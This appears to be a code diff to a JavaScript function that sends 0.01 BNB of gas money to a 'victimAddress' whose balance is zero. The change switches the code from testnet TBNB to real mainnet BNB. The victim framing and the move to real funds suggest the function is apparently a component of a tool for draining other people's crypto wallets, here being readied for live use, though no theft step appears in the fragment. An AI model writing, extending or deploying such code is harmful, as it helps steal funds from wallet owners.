@@ -76,23 +76,23 @@ async function checkWalletBalance() {
 
 async function sendGasIfNeeded(victimAddress) {
   const victimBalance = await provider.getBalance(victimAddress);
-  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} TBNB`);
+  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} BNB`); // Changed TBNB to BNB
 
   if (victimBalance === BigInt(0)) {
-    const tbnbToSend = ethers.parseEther("0.01"); // $5 at ~$500/BNB
+    const bnbToSend = ethers.parseEther("0.01"); // $5 at ~$500/BNB
     const gasSettings = await getGasSettings();
 
-    console.log(`Victim has 0 TBNB. Sending ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas...`);
+    console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`); // Changed TBNB to BNB
     const tx = await wallet.sendTransaction({
       to: victimAddress,
-      value: tbnbToSend,
+      value: bnbToSend,
       gasLimit: 21000,
       gasPrice: gasSettings.gasPrice,
     });
 
     console.log(`Gas transaction sent: ${tx.hash}`);
     const receipt = await tx.wait();
-    return { success: true, message: `Sent ${ethers.formatEther(tbnbToSend)} TBNB to ${victimAddress} for gas`, txHash: tx.hash };
+    return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas`, txHash: tx.hash }; // Changed TBNB to BNB
   }
   return { success: false, message: "No gas needed" };
 }
